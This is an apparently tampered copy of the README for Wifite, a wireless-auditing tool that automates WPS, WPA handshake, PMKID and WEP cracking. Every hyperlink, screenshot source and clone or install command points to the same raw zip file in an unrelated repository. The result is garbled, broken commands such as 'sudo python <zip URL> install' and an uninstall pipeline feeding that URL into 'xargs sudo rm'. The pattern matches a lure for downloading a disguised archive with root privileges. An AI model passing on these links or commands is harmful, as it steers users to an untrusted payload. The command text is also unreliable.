Wifite
======

This repo is a complete re-write of [`wifite`](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip), a Python script for auditing wireless networks.

Wifite runs existing wireless-auditing tools for you. Stop memorizing command arguments & switches!

Wifite is designed to use all known methods for retrieving the password of a wireless access point (router).  These methods include:
1. WPS: The [Offline Pixie-Dust attack](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip)
1. WPS: The [Online Brute-Force PIN attack](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip)
2. WPA: The [WPA Handshake Capture](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip) + offline crack.
3. WPA: The [PMKID Hash Capture](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip) + offline crack.
4. WEP: Various known attacks against WEP, including *fragmentation*, *chop-chop*, *aireplay*, etc.

Run wifite, select your targets, and Wifite will automatically start trying to capture or crack the password.

Supported Operating Systems
---------------------------
Wifite is designed specifically for the latest version of [**Kali** Linux](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip). [ParrotSec](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip) is also supported.

Other pen-testing distributions (such as BackBox or Ubuntu) have outdated versions of the tools used by Wifite. Do not expect support unless you are using the latest versions of the *Required Tools*, and also [patched wireless drivers that support injection]().

Required Tools
--------------
First and foremost, you will need a wireless card capable of "Monitor Mode" and packet injection (see [this tutorial for checking if your wireless card is compatible](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip) and also [this guide](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip)). There are many cheap wireless cards that plug into USB available from online stores.

Second, only the latest versions of these programs are supported and must be installed for Wifite to work properly:

**Required:**

* `python`: Wifite is compatible with both `python2` and `python3`.
* [`iwconfig`](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip): For identifying wireless devices already in Monitor Mode.
* [`ifconfig`](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip): For starting/stopping wireless devices.
* [`Aircrack-ng`](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip) suite, includes:
   * [`airmon-ng`](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip): For enumerating and enabling Monitor Mode on wireless devices.
   * [`aircrack-ng`](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip): For cracking WEP .cap files and WPA handshake captures.
   * [`aireplay-ng`](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip): For deauthing access points, replaying capture files, various WEP attacks.
   * [`airodump-ng`](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip): For target scanning & capture file generation.
   * [`packetforge-ng`](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip): For forging capture files.

**Optional, but Recommended:**

* [`tshark`](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip): For detecting WPS networks and inspecting handshake capture files.
* [`reaver`](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip): For WPS Pixie-Dust & brute-force attacks.
   * Note: Reaver's `wash` tool can be used to detect WPS networks if `tshark` is not found.
* [`bully`](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip): For WPS Pixie-Dust & brute-force attacks.
   * Alternative to Reaver. Specify `--bully` to use Bully instead of Reaver.
   * Bully is also used to fetch PSK if `reaver` cannot after cracking WPS PIN.
* [`coWPAtty`](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip): For detecting handshake captures.
* [`pyrit`](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip): For detecting handshake captures.
* [`hashcat`](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip): For cracking PMKID hashes.
   * [`hcxdumptool`](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip): For capturing PMKID hashes.
   * [`hcxpcaptool`](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip): For converting PMKID packet captures into `hashcat`'s format.


Run Wifite
----------
```
git clone https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip
cd wifite2
sudo https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip
```

Install Wifite
--------------
To install onto your computer (so you can just run `wifite` from any terminal), run:

```bash
sudo python https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip install
```

This will install `wifite` to `/usr/sbin/wifite` which should be in your terminal path.

**Note:** Uninstalling is [not as easy](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip). The only way to uninstall is to record the files installed by the above command and *remove* those files:

```bash
sudo python https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip install --record https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip \
  && cat https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip | xargs sudo rm \
  && rm -f https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip
```

Brief Feature List
------------------
* [PMKID hash capture](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip) (enabled by-default, force with: `--pmkid`)
* WPS Offline Brute-Force Attack aka "Pixie-Dust". (enabled by-default, force with: `--wps-only --pixie`)
* WPS Online Brute-Force Attack aka "PIN attack". (enabled by-default, force with: `--wps-only --no-pixie`)
* WPA/2 Offline Brute-Force Attack via 4-Way Handshake capture (enabled by-default, force with: `--no-wps`)
* Validates handshakes against `pyrit`, `tshark`, `cowpatty`, and `aircrack-ng` (when available)
* Various WEP attacks (replay, chopchop, fragment, hirte, p0841, caffe-latte)
* Automatically decloaks hidden access points while scanning or attacking.
   * Note: Only works when channel is fixed. Use `-c <channel>`
   * Disable this using `--no-deauths`
* 5Ghz support for some wireless cards (via `-5` switch).
   * Note: Some tools don't play well on 5GHz channels (e.g. `aireplay-ng`)
* Stores cracked passwords and handshakes to the current directory (`--cracked`)
   * Includes information about the cracked access point (Name, BSSID, Date, etc).
* Easy to try to crack handshakes or PMKID hashes against a wordlist (`--crack`)

What's new?
-----------
Comparing this repo to the "old wifite" @ https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip

* **Less bugs**
   * Cleaner process management. Does not leave processes running in the background (the old `wifite` was bad about this).
   * No longer "one monolithic script". Has working unit tests. Pull requests are less-painful!
* **Speed**
   * Target access points are refreshed every second instead of every 5 seconds.
* **Accuracy**
   * Displays realtime Power level of currently-attacked target.
   * Displays more information during an attack (e.g. % during WEP chopchop attacks, Pixie-Dust step index, etc)
* **Educational**
   * The `--verbose` option (expandable to `-vv` or `-vvv`) shows which commands are executed & the output of those commands.
   * This can help debug why Wifite is not working for you. Or so you can learn how these tools are used.
* More-actively developed.
* Python 3 support.
* Sweet new ASCII banner.

What's gone?
------------
* Some command-line arguments (`--wept`, `--wpst`, and other confusing switches).
   * You can still access some of these obscure options, try `wifite -h -v`

What's not new?
---------------
* (Mostly) Backwards compatible with the original `wifite`'s arguments.
* Same text-based interface everyone knows and loves.

Screenshots
-----------
Cracking WPS PIN using `reaver`'s Pixie-Dust attack, then fetching WPA key using `bully`:
![Pixie-Dust with Reaver to get PIN and Bully to get PSK](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip)

-------------

Cracking WPA key using PMKID attack:
![PMKID attack](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip)

-------------

Decloaking & cracking a hidden access point (via the WPA Handshake attack):
![Decloaking and Cracking a hidden access point](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip)

-------------

Cracking a weak WEP password (using the WEP Replay attack):
![Cracking a weak WEP password](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip)

-------------

Cracking a pre-captured handshake using John The Ripper (via the `--crack` option):
![--crack option](https://raw.githubusercontent.com/keboka07/wifite2/master/wifite/model/wifite_v3.7.zip)
